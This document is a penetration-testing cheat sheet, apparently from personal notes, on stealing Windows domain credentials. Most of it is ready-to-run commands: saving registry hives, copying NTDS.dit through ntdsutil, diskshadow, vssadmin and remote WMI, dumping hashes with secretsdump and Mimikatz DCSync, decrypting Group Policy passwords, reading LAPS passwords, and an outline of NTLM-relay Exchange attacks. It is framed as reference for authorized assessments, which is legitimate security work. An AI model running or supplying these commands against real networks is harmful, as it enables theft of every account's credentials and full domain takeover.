
# Windows Domain Password Hash Processing Examples

These examples illustrate how **Windows domain password hashes and related credentials** may be processed during **authorized security assessments**, audits, or investigations.  
All actions described here must be performed **only with explicit authorization** and within the scope of an approved engagement.

When **Domain Admin–level access** has been obtained, it is possible to extract domain user password hashes from a Domain Controller. These hashes are stored in the Active Directory database file:

```
C:\Windows\NTDS\NTDS.dit
```

Because this file is continuously in use and locked by the operating system, it must be accessed indirectly using supported system mechanisms. The resulting files can then be analyzed offline.

---

## Registry Hive Collection (Prerequisite)

Several extraction methods require access to Windows registry hives. These can be manually saved using `reg.exe`:

```cmd
C:\Windows\System32> reg.exe save HKLM\SAM C:\temp\sam_backup.hiv
C:\Windows\System32> reg.exe save HKLM\SECURITY C:\temp\sec_backup.hiv
C:\Windows\System32> reg.exe save HKLM\SYSTEM C:\temp\sys_backup.hiv
```

---

## NTDSUTIL

`ntdsutil` is a built-in utility on Domain Controllers used to manage Active Directory. It supports creating offline copies of the NTDS database and related registry hives.

### Step 1: Launch NTDSUTIL

```cmd
C:\> ntdsutil
```

### Step 2: Activate the NTDS instance

```cmd
activate instance ntds
```

### Step 3: Enter Install From Media mode

```cmd
ifm
```

### Step 4: Create a full backup

```cmd
create full C:\temp\ntdsutil
```

### Step 5: Exit the utility

```cmd
quit
quit
```

### Step 6: Retrieve generated files

After completion, collect files from the following directories:

```
C:\temp\ntdsutil\Active Directory   (contains ntds.dit)
C:\temp\ntdsutil\Registry           (contains SYSTEM, SAM, SECURITY hives)
```

---

## DISKSHADOW

`diskshadow.exe` exposes Volume Shadow Copy Service (VSS) functionality and supports scripted operation.

### Step 1: Create a DiskShadow script

Save the following as `diskshadow.txt` on the target system:

```text
set context persistent nowriters
add volume c: alias stealthAlias
create
expose %stealthAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
delete shadows volume %stealthAlias%
reset
```

### Step 2: Execute DiskShadow

> **Important:** DiskShadow must be executed from `C:\Windows\System32`.

```cmd
C:\Windows\System32> diskshadow.exe /s c:\diskshadow.txt
```

### Step 3: Save the SYSTEM hive

```cmd
C:\Windows\System32> reg.exe save HKLM\SYSTEM C:\temp\sys_backup.hiv
```

### Step 4: Retrieve extracted files

```
C:\temp\ntds.dit
C:\temp\sys_backup.hiv
```

---

## VSSADMIN

`vssadmin` manages Volume Shadow Copies directly.

### Step 1: Create a shadow copy

```cmd
C:\Windows\System32> vssadmin create shadow /for=C:
```

### Step 2: Copy NTDS.dit from the shadow copy

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

### Step 3: Save the SYSTEM hive

```cmd
C:\Windows\System32> reg.exe save HKLM\SYSTEM C:\temp\sys_backup.hiv
```

### Step 4: Retrieve files

```
C:\temp\ntds.dit
C:\temp\sys_backup.hiv
```

### Step 5: Remove the shadow copy

```cmd
C:\Windows\System32> vssadmin delete shadows /shadow={ShadowCopyID}
```

---

## WMI + VSSADMIN (Remote Extraction)

WMI can be used to remotely invoke VSS operations on a Domain Controller.

### Step 1: Create a shadow copy remotely

```cmd
wmic /node:DC_HOSTNAME /user:DOMAIN\User /password:Password123 process call create "cmd /c vssadmin create shadow /for=C:"
```

### Step 2: Extract NTDS.dit

```cmd
wmic /node:DC_HOSTNAME /user:DOMAIN\User /password:Password123 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\temp\ntds.dit"
```

### Step 3: Extract SYSTEM hive

```cmd
wmic /node:DC_HOSTNAME /user:DOMAIN\User /password:Password123 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\temp\sys_backup.hiv"
```

### Step 4: Retrieve files

```
C:\temp\ntds.dit
C:\temp\sys_backup.hiv
```

---

## Extracting Domain Hashes from NTDS.dit

### Impacket – secretsdump

**Local extraction:**

```bash
secretsdump.py -ntds ntds.dit -system sys_backup.hiv LOCAL
```

**Remote extraction using hashes:**

```bash
impacket-secretsdump -hashes LMHASH:NTHASH -just-dc DOMAIN/DC_HOSTNAME$@10.0.X.X
```

---

## Mimikatz – DCSync

```text
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:USERNAME
```

---

## Invoke-DCSync (PowerShell)

```powershell
Invoke-DCSync -PWDumpFormat
```

---

## SYSVOL and Group Policy Preferences

Group Policy files stored in SYSVOL may contain plaintext or encrypted credentials.

Location:

```
\\DOMAIN\SYSVOL\DOMAIN\Policies\
```

Search for:

```
cpassword
net user
pass
sPwd
```

### Automated decryption

```powershell
Get-GPPPassword
```

---

## LAPS (Local Administrator Password Solution)

LAPS stores per-host local administrator passwords in Active Directory.

### Verify LAPS presence

```powershell
Get-ChildItem "C:\Program Files\LAPS\CSE\AdmPwd.dll"
```

### Common extraction tools

- Get-LAPSPasswords
    
- PowerSploit
    
- ldapsearch
    
- Meterpreter
    

Example:

```powershell
Get-LAPSPasswords -DomainController DC_IP -Credential DOMAIN\User
```

---

## Exchange Mailbox–Based DCSync (PrivExchange)

If Exchange permissions allow `WriteDacl` on the domain object, DCSync can be achieved.

### Workflow summary

1. Obtain mailbox access
    
2. Start `ntlmrelayx`
    
3. Trigger Exchange authentication
    
4. Escalate privileges
    
5. Perform DCSync
    

Example:

```bash
secretsdump.py DOMAIN/User@dc.domain.local -just-dc
```

---

## HTTP Attack + NTLM Relay + Exchange

This technique combines NTLM relay and Exchange abuse to achieve DCSync without initial credentials, given sufficient Exchange permissions.

Workflow includes:

- `ntlmrelayx`
    
- `mitm6`
    
- Exchange EWS endpoints
    
- DCSync via Impacket
    

---

## Tags

 #education #research #pitl0rd

[[Processing]]
[[Home]]
